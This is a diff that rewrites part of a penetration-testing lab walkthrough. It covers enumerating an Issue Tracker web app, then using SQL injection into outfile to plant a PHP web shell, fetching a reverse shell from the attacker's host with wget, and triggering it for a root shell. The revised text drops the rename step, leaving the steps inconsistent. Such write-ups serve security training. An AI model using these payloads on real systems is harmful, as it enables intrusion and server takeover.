@@ -432,28 +432,33 @@ We continue with enumeration and use feroxbuster to scan port 30455. The scan re
 - We execute a feroxbuster directory scan and find an accessible phpinfo.php file
 
 
-#### -Navigated to http://192.168.241.147:30455/phpinfo.php and found "/srv/http" showing the root directory of the webserver:
+- We access the website at http://192.168.241.147:30455/phpinfo.php. Then find "/srv/http," is the web server's root directory:
 
 ![](Images/Pasted%20image%2020221011103221.png)
 #webserverrootdirectory
 
-## Port 17445 - HTTP uknown
+## Port 17445 
 
-#### -Navigated to http://192.168.65.147:17445/ and found the following wepage showing as "Issue Tracker"
-
+- We access the website via http://192.168.65.147:17445. and discover that the "Issue Tracker" webpage is displayed here.
+  
 ![](Images/Pasted%20image%2020221011103451.png)
 
-#### -Clicked the "Register" link and registered and signed in with the credentials I created
-#### -Navigated to directory "/issue/checkByPriority" per the findings this directory existed from analyzing the source code in the "IssueControler.java" file and was directed to the following web page:
+We register and log in with the setup credentials and navigate to the "/issue/checkByPriority" directory. We receive a 405 error, which indicates that the HTTP method we are using is not allowed.
 
+- We select the "Register" link, make an account, and sign in using those credentials.
+  
+- We navigate to the "/issue/checkByPriority" directory. After examining the "IssueControler.java" file's source code, it was discovered that this directory existed and  it led to the following webpage:
+  
 ![](Images/Pasted%20image%2020221011103541.png)
 
-#### -As we know the directory "/issue/checkByPriority" exists I navigated to Burpsuite to confirm what is going on in the background. Forwarded the request to "repeater" and found the following showing that "POST" is allowed:
+To investigate further, we bring up Burp Suite to see what is taking place on in the background. We send the webpage for port 17455 to the repeater and find that “POST” is allowed. We change the method to “POST” in the repeater and find that the error code changes to 400.
 
+- The directory "/issue/checkByPriority" is known to exist. In order to verify what is happening in the background, we browse to Burpsuite. The following indicates that "POST" is permitted after we send the request to "repeater":
+  
 ![](Images/Pasted%20image%2020221011103632.png)
 
-#### -Changed "GET" to "POST" and found the error code changed from "405" to "400"
-
+- We switch from "GET" to "POST" and observe that the error code has changed from "405" to "400".
+  
 ![](Images/Pasted%20image%2020221011103739.png)
 
 #GETtoPOSTChangeInBurpsuite
@@ -461,33 +466,39 @@ We continue with enumeration and use feroxbuster to scan port 30455. The scan re
 ---
 
 # Exploitation
-## SQL Injection in Burpsuite
-#### -Googled "sql injection reverse shell" and found the following web page showing the following commands to upload a cmd.php page to the server in order to get command execution:
+## SQL Injection
 
+We now have enough information to exploit the vulnerability. We Google “SQL injection reverse shell” and find the syntax for uploading a cmd.php page to the server to get command execution. We add the “priority” parameter and URL-encoded syntax to Burp Suite and forward the request.
+
+- We search for "SQL injection reverse shell" on Google and come across the following link, which provides instructions on how to upload a cmd.php page to the server in order to obtain command execution:
+  
 ![](Images/Pasted%20image%2020221011103839.png)
 
 ![](Images/Pasted%20image%2020221011103926.png)
 
-#### -URL encoded the following commands:
-"' union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'"
+- We URL-encode the following command:
 
-#### -Added "priority='' paramater and the URL encoded syntax above into Burpsuite and forwarded the request:
+'union select '<?php echo system($_REQUEST["cmd"]); ?>' into outfile '/srv/http/cmd.php'
 
+- We add the URL-encoded syntax above and the "priority='' parameter to Burpsuite and send the request:
+  
 ![](Images/Pasted%20image%2020221011104021.png)
 
-#### -Navigated to "http://192.168.213.147:30455/cmd.php?cmd=" and typed "whoami" and confirmed we can run os commands:
-
+- We navigate to "http://192.168.213.147:30455/cmd.php?cmd=", type "whoami" and confirm we can run OS commands:
+  
 ![](Images/Pasted%20image%2020221011104107.png)
 
 #sqlinjection
 
-#### -Saved "/usr/share/webshells/php/php-reverse-shell.php" to a file named "rev1.php" on my kali machine
+- On our Kali machine, we save "/usr/share/webshells/php/php-reverse-shell.php" to a file called "rev1.php".
+
 #php-reverse-shell-php
 
-#### -Typed "http://192.168.228.147/cmd.php?cmd=wget http://[kali IP]:30455/rev1.php -o /srv/http/rev1.php"
-#### -Typed "http://192.168.228.147/cmd.php?cmd=mv rev1.php.1 rev2.php" as I found the reverse shell script got renamed to "rev1.php.1". (As the file originally ended in ".1" the reverse shell was unable to be executed as it needs to end in extension ".php" to execute)
+- We enter "http://192.168.228.147/cmd.php?cmd=wget http://[kali IP]:30455/rev1.php -o /srv/http/rev1.php"
 
-#### -Set up a listener on port 30455. Typed "curl http://192.168.213.147:30455/rev2.php " on my kali machine and received a root shell:
+- We setup a listener on port 30455 on our Kali machine. 
+
+- We type "curl http://192.168.213.147:30455/rev2.php" on our Kali terminal and receive a root shell:
 
 ![](Images/Pasted%20image%2020221011185330.png)
 ---
